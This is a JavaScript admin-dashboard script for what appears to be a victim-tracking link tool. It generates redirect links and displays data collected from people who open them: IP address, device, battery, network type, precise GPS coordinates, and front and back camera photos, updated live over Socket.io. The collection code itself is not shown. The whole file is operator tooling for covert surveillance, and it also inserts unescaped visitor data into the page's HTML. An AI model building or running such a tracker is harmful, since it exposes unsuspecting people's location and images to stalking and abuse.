let socket;
let currentVisitorId = null;

// Connect to Socket.io
socket = io();

// Check if admin is logged in
fetch('/api/visitors')
    .then(response => {
        if (response.status === 401) {
            window.location.href = '/';
        }
        return response.json();
    })
    .catch(() => {
        window.location.href = '/';
    });

// Socket events
socket.on('visitor-connected', () => {
    loadVisitors();
    updateStats();
    showNotification('🟢 New visitor connected!');
});

socket.on('visitor-disconnected', () => {
    loadVisitors();
    updateStats();
});

socket.on('camera-data', (data) => {
    if (currentVisitorId === data.visitorId) {
        showVisitorDetails(currentVisitorId);
    }
});

socket.on('location-data', (data) => {
    if (currentVisitorId === data.visitorId) {
        showVisitorDetails(currentVisitorId);
    }
});

// Generate custom link
function generateCustomLink() {
    const url = document.getElementById('customUrl').value;
    if (!url) {
        alert('Please enter a URL');
        return;
    }
    
    fetch('/generate-custom-link', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ redirectUrl: url })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            document.getElementById('generatedLinkContainer').style.display = 'block';
            document.getElementById('generatedLink').value = data.link;
            document.getElementById('redirectUrlDisplay').textContent = data.redirectUrl;
            showNotification('✅ Link generated successfully!');
            loadVisitors();
            updateStats();
        }
    })
    .catch(error => {
        alert('Error: ' + error.message);
    });
}

// Load visitors
function loadVisitors() {
    fetch('/api/visitors')
        .then(response => response.json())
        .then(visitors => {
            displayVisitors(visitors);
        });
}

// Display visitors
function displayVisitors(visitors) {
    const container = document.getElementById('visitorsList');
    container.innerHTML = '';
    
    visitors.forEach(visitor => {
        const card = document.createElement('div');
        card.className = 'visitor-card';
        
        let locationStr = '';
        if (visitor.location) {
            const loc = visitor.location;
            locationStr = `📍 ${loc.city || ''} ${loc.state || ''} ${loc.country || ''}`;
        }
        
        card.innerHTML = `
            <div class="visitor-header">
                <div>
                    <strong>ID: ${visitor.id.substring(0, 8)}</strong>
                    <div style="font-size:14px; color:#666; margin-top:5px;">
                        📱 ${visitor.deviceName || 'Unknown'} 
                        ${visitor.ip ? `• 🌐 ${visitor.ip}` : ''}
                    </div>
                    ${locationStr ? `<div style="font-size:13px; color:#888;">${locationStr}</div>` : ''}
                    ${visitor.battery ? `<div style="font-size:13px; color:#888;">🔋 ${visitor.battery}%</div>` : ''}
                </div>
                <span class="status ${visitor.connected ? 'active' : 'inactive'}">
                    ${visitor.connected ? '🟢 Active' : '🔴 Offline'}
                </span>
            </div>
            <div style="margin-top:10px;">
                <button onclick="showVisitorDetails('${visitor.id}')" class="camera-btn">📊 View Details</button>
                <button onclick="deleteVisitor('${visitor.id}')" class="camera-btn delete">🗑️ Delete</button>
            </div>
            ${visitor.frontCamera ? `<div style="margin-top:10px;"><img src="${visitor.frontCamera}" style="max-width:80px; border-radius:5px;"></div>` : ''}
        `;
        container.appendChild(card);
    });
}

// Show visitor details
function showVisitorDetails(visitorId) {
    currentVisitorId = visitorId;
    const container = document.getElementById('detailsContent');
    const detailsDiv = document.getElementById('visitorDetails');
    
    fetch(`/api/visitor/${visitorId}`)
        .then(response => response.json())
        .then(visitor => {
            detailsDiv.style.display = 'block';
            
            let html = `
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
                    <div>
                        <h3>👤 Visitor Information</h3>
                        <div class="visitor-details-grid">
                            <div class="detail-card"><label>🆔 ID</label><div class="value">${visitor.id}</div></div>
                            <div class="detail-card"><label>📱 Device</label><div class="value">${visitor.deviceName || 'N/A'}</div></div>
                            <div class="detail-card"><label>🌐 IP Address</label><div class="value">${visitor.ip || 'N/A'}</div></div>
                            <div class="detail-card"><label>📶 Network</label><div class="value">${visitor.network?.effectiveType || 'N/A'}</div></div>
                            <div class="detail-card"><label>🔋 Battery</label><div class="value">${visitor.battery || 'N/A'}%</div></div>
                            <div class="detail-card"><label>📅 Visit Date</label><div class="value">${visitor.visitDate ? new Date(visitor.visitDate).toLocaleString() : 'N/A'}</div></div>
                            <div class="detail-card"><label>🟢 Status</label><div class="value">${visitor.connected ? 'Online' : 'Offline'}</div></div>
                        </div>
                    </div>
                    <div>
                        <h3>📍 Location</h3>
                        ${visitor.location ? `
                            <div class="visitor-details-grid">
                                <div class="detail-card"><label>🌍 Country</label><div class="value">${visitor.location.country || 'N/A'}</div></div>
                                <div class="detail-card"><label>🏛️ State</label><div class="value">${visitor.location.state || 'N/A'}</div></div>
                                <div class="detail-card"><label>🏙️ City</label><div class="value">${visitor.location.city || 'N/A'}</div></div>
                                <div class="detail-card"><label>📍 Coordinates</label><div class="value">${visitor.location.lat || 'N/A'}, ${visitor.location.lng || 'N/A'}</div></div>
                            </div>
                        ` : '<p>Location not available</p>'}
                        
                        <h3 style="margin-top:20px;">📸 Photos</h3>
                        <div style="display:flex; gap:10px; flex-wrap:wrap;">
                            ${visitor.frontCamera ? `<div><p><strong>Front</strong></p><img src="${visitor.frontCamera}" class="camera-image"></div>` : ''}
                            ${visitor.backCamera ? `<div><p><strong>Back</strong></p><img src="${visitor.backCamera}" class="camera-image"></div>` : ''}
                        </div>
                    </div>
                </div>
            `;
            container.innerHTML = html;
        });
}

// Delete visitor
function deleteVisitor(visitorId) {
    if (!confirm('Delete this visitor data?')) return;
    
    fetch(`/api/visitor/${visitorId}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('🗑️ Visitor deleted');
                loadVisitors();
                updateStats();
                document.getElementById('visitorDetails').style.display = 'none';
            }
        });
}

// Update stats
function updateStats() {
    fetch('/api/visitors')
        .then(response => response.json())
        .then(visitors => {
            document.getElementById('totalVisitors').textContent = visitors.length;
            document.getElementById('activeVisitors').textContent = visitors.filter(v => v.connected).length;
            document.getElementById('totalLinks').textContent = visitors.length;
        });
}

// Copy link
function copyLink() {
    const linkInput = document.getElementById('generatedLink');
    linkInput.select();
    document.execCommand('copy');
    showNotification('📋 Link copied!');
}

// Logout
function logout() {
    window.location.href = '/';
}

// Show notification
function showNotification(message) {
    const existing = document.querySelector('.notification');
    if (existing) existing.remove();
    const div = document.createElement('div');
    div.className = 'notification';
    div.textContent = message;
    document.body.appendChild(div);
    setTimeout(() => {
        div.style.opacity = '0';
        div.style.transition = 'opacity 0.5s';
        setTimeout(() => div.remove(), 500);
    }, 3000);
}

// Initial load
loadVisitors();
updateStats();
setInterval(() => {
    loadVisitors();
    updateStats();
}, 10000);